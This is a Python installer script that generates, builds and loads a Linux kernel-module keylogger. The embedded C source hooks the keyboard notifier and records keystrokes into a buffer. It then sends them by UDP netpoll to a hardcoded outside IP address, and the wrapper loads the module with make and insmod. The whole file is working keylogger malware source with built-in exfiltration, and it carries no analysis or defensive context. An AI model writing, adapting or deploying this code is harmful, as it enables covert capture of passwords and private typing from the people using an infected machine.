#!/usr/bin/python
from commands import getoutput
import socket
import fcntl
import struct

def get_ip_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', ifname[:15])
    )[20:24])

def ip_addr_to_hex_str(ip):
    parts = ip.split(".")
    hex_str = "0x"
    for part in parts:
        str_part = hex(int(part)).replace("0x", "")
	if len(str_part) == 1:
		str_part = "0" + str_part
	hex_str += str_part
    return hex_str

local_ip = ip_addr_to_hex_str(get_ip_address("eth0"))
print("INSTALLING WITH LOCAL IP ADDRESS OF %s" % local_ip)

src = """#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/interrupt.h>
#include <linux/proc_fs.h>
#include <linux/string.h>
#include <linux/netpoll.h>
#include <asm/io.h>
#include <linux/keyboard.h>

#include "keylogger.h"

#define PROC_FILE_NAME "kl"
#define BUFFER_SIZE 32

static char kl_buffer[BUFFER_SIZE+1];
static int kl_buffer_offset = 0;
static struct file_operations proc_fops;
static struct netpoll *np = NULL;
static struct netpoll np_t;
static struct notifier_block nb;

// INADDR_LOCAL is the local ip address, since 127.0.0.1 wont work..
// you'll have to replace this with the hex of the ip for the computer you're adding this
// module to
#define INADDR_LOCAL ((unsigned long int)%s) // 10.96.6.43
#define INADDR_SEND ((unsigned long int)0x4A76164B) // 74.118.22.75 (isoptera.lcsc.edu)

static void send_msg(char *msg, size_t size)
{
		if(kl_buffer[0] != '\0') {
			netpoll_send_udp(np, msg, size);
		}
}

/*
 This function services keyboard interrupts.
*/
static void reset_buffer(void)
{
	send_msg(kl_buffer, kl_buffer_offset);
	kl_buffer_offset = 0;
	memset(kl_buffer, 0, BUFFER_SIZE);
}


static ssize_t read_simple(struct file *filp, char *buf, size_t count, loff_t *offp) 
{
	int read_size;
	if(count > BUFFER_SIZE) {
		read_size = BUFFER_SIZE;
	} else {
		read_size = count;
	}

	copy_to_user(buf, kl_buffer, read_size);
	reset_buffer();
	return read_size;
}

static void setup_netpoll(void)
{
	np_t.name = "LRNG";
	strlcpy(np_t.dev_name, "eth0", IFNAMSIZ);
	np_t.local_ip.ip = htonl(INADDR_LOCAL);
	np_t.remote_ip.ip = htonl(INADDR_SEND);
	np_t.local_port = 5000;
	np_t.remote_port = 5135;
	memset(np_t.remote_mac, 0xff, ETH_ALEN);
	netpoll_setup(&np_t);
	np = &np_t;
}

int hello_notify(struct notifier_block *nblock, unsigned long code, void *_param) {
	struct keyboard_notifier_param *param = _param;
	//struct vc_data *vc = param->vc;
//	int ret = NOTIFY_OK;
	int scancode;
	int reslt;
	char c;
			  
	if (code == KBD_KEYCODE) {
		scancode = param->value;
		if(!param->down) {
			scancode += 0x80;
		}

		reslt = handle_scancode(scancode, &c);
		if(reslt == NEW_CHAR) {
			if(kl_buffer_offset >= BUFFER_SIZE) {
				reset_buffer();
			}
			kl_buffer[kl_buffer_offset++] = c;
		}
	}
	return 0;
}

/*
 Initialize the module - register the IRQ handler
*/
static int __init init_keylogger(void)
{
	proc_fops.read = read_simple;
	nb.notifier_call = hello_notify;
	register_keyboard_notifier(&nb);
//	proc_create(PROC_FILE_NAME, 0, NULL, &proc_fops);
	setup_netpoll();
	return 0;
}

static void __exit exit_keylogger(void)
{
	unregister_keyboard_notifier(&nb);
//	remove_proc_entry(PROC_FILE_NAME, NULL);
}

module_init(init_keylogger);
module_exit(exit_keylogger);
MODULE_LICENSE ("GPL");""" % local_ip

with open("keylogger.c", "w") as src_f:
    src_f.write(src)

resp = getoutput("make")
resp = getoutput("insmod ems_log.ko")
if(len(resp) > 0):
    print("AN ERROR OCCURRED: %s" % resp)

